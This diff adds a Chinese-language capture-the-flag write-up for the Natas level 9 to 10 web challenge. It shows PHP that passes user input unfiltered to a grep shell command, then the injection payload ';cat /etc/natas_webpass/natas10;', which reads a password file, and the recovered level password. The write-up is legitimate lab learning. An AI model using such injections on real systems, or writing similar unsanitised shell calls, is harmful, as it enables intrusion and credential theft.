@@ -313,9 +313,64 @@ Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 
 ## Level 9 -> Level 10
 
+给了源码，所以当然看看源码  
+
+```html
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+Output:
+```
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+这段php和上面的表单，就是获取用户的输入，然后运行`grep -i`在文件`dictionary.txt`里进行匹配  
+本来以为直接输入password就行了，但是结果如下：  
+
+```
+password
+password's
+passwords
+```
+
+我还想着是不是密码在匹配到的文本的下一行之类的，但是使用`-v -`作为输入后，获取了完整的文件内容（应该），然后用页面搜索看了看  
+这个文件里面根本没有密码  
+
+然后换个思路，既然都可以使用`-v`这种方式了，毕竟这个php没做输入过滤，所以为什么不直接试试运行一个`cat`来看密码呢？  
+
+```bash
+"grep -i $key dictionary.txt" # 首先这是php匹配的源码
+/etc/natas_webpass/natas10    # 然后这个是密码路径，至于为什么，这个在natas开头页就说过了，前面也用过这一点
+# 这个就是预期的命令，也就是输入内容点击提交以后，php实际运行的shell命令
+# cat 看密码自然不用说
+# 在cat 的命令前后添加分号，这样可以让命令在之下错误的情况下继续执行该行后面的命令
+# 毕竟前后两个都不是完整的命令
+"grep -i ;cat /etc/natas_webpass/natas10;dictionary.txt"
+```
+
+所以这就是需要输入的内容：  
+`;cat /etc/natas_webpass/natas10;`，输入提交就能得到密码了  
+
+> Output:  
+> D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE  
+
+
 ### 密码
 
 ```
+D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
 ```
 
 ## Level 10 -> Level 11
